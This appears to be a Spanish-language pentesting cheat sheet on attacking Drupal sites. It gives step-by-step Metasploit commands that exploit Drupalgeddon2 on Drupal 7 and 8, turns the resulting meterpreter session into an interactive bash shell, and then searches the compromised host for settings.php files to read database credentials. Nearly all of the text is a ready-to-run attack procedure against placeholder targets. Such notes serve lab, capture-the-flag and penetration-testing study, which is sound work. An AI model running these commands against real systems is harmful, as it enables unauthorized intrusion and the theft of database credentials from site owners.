# Drupal

Drupal es un CMS alternativo a WordPress. Drupalgeddon es una vulnerabilidad critica en versiones antiguas.

## Identificar la Version

```bash
whatweb http://<IP>/
```

## Explotacion de Drupal 7 (Drupalgeddon2)

```bash
msfconsole
search drupal 7
use 1
show options
set RHOSTS <IP_objetivo>
set TARGETURI /drupal
run
```

En la sesion de meterpreter:

```bash
shell
bash -i
```

## Explotacion de Drupal 8 (Drupalgeddon2)

```bash
msfconsole
search drupal 8
use exploit/unix/webapp/drupal_drupalgeddon2
show options
set RHOSTS <IP_objetivo>
exploit
```

En meterpreter:

```bash
shell
bash -i
```

## Encontrar Credenciales en settings.php

```bash
find / -name settings.php 2>/dev/null
cat /ruta/settings.php
```

> El archivo `settings.php` de Drupal puede contener credenciales de la base de datos.
